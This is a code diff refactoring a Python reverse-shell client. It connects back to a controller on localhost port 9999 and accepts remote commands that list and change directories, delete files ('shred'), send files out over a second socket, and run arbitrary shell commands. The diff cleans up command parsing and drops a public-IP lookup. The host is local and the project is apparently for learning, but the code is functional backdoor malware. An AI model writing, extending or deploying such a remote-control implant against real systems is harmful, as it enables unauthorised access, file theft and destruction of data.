@@ -3,6 +3,9 @@ import os
 import subprocess
 import urllib.request
 
+#TODO
+
+# get os type, get log of what's sent and executed (just unit test)
 
 def pwd():
     """Return current working directory."""
@@ -49,33 +52,30 @@ def command(cmd):
     return proc
 
 
-def publish():
-    """Get IP address."""
-    r = urllib.request.urlopen('https://api.ipify.org')
-    ip_address = r.read().decode()
-    print(ip_address)
-
-
 def main():
-    publish()
 
     conn = socket.socket()
     conn.connect(('127.0.0.1', 9999))
 
     while True:
-        cwd = pwd()
+        cwd = os.getcwd()
         conn.sendall(f"\n{cwd}:~$$$ ".encode())
         cmd = conn.recv(4096).decode()
 
-        if cmd.lower().rstrip() == "pwd":
+        split_command = cmd.rstrip().split(maxsplit=1)
+        command_name = split_command[0].lower()
+        arguments = split_command[1] if len(split_command) > 1 else ""
+
+
+        if command_name == "pwd":
             conn.sendall(pwd().encode())
             continue
 
-        elif cmd.lower().rstrip() == "whoami":
+        elif command_name == "whoami":
             conn.sendall(whoami().encode())
             continue
 
-        elif cmd.lower().rstrip() == "ls":
+        elif command_name == "ls":
             try:
                 for item in ls():
                     conn.sendall(f"{item}\n".encode())
@@ -84,32 +84,27 @@ def main():
                 conn.sendall(f"Could not list directory: {e}\n".encode())
                 continue
 
-        elif cmd.lower().rstrip().startswith('cd'): 
-            split_command = cmd.split()
-            new_directory = ' '.join(split_command[1:])
+        elif command_name == "cd": 
             try:
-                cd(new_directory)
+                cd(arguments)
                 continue
             except Exception as e:
                 conn.sendall(f"Could not change directory: {e}\n".encode())
                 continue
 
-        elif cmd.lower().rstrip().startswith('shred'):
-            split_command = cmd.split()
-            item = split_command[1]
+        elif command_name == 'shred':
             try:
-                if os.path.isdir(item):
-                    os.rmdir(item)
+                if os.path.isdir(arguments):
+                    os.rmdir(arguments)
                 else:
-                    os.remove(item)
+                    os.remove(arguments)
                 continue
             except Exception as e:
                 conn.sendall(f"Could not remove item: {e}".encode())
                 continue
 
-        elif cmd.lower().rstrip().startswith('send'):
-            split_command = cmd.split()
-            file_path = ' '.join(split_command[1:])
+        elif command_name == "send":
+            file_path = arguments
             try:
                 send_socket = socket.socket()
                 send_socket.connect(('127.0.0.1', 10000))
@@ -120,9 +115,8 @@ def main():
                 conn.sendall(f"Could not send file: {e}".encode())
                 continue
 
-        elif cmd.lower().rstrip().startswith('command'):
-            split_command = cmd.split()
-            process = command(' '.join(split_command[1:]))
+        elif command_name == "command":
+            process = command(arguments)
             if process.stdout:
                 conn.sendall(process.stdout)
                 continue
@@ -130,9 +124,12 @@ def main():
                 conn.sendall(process.stderr)
                 continue
 
-        elif cmd.lower().rstrip() == "exitnow":
+        elif command_name == "exitnow":
             conn.sendall(b">>>>> Closing connection.\n")
             conn.close()
             break
+
+        else:
+            conn.sendall(b"Invalid command.")
     
 main()
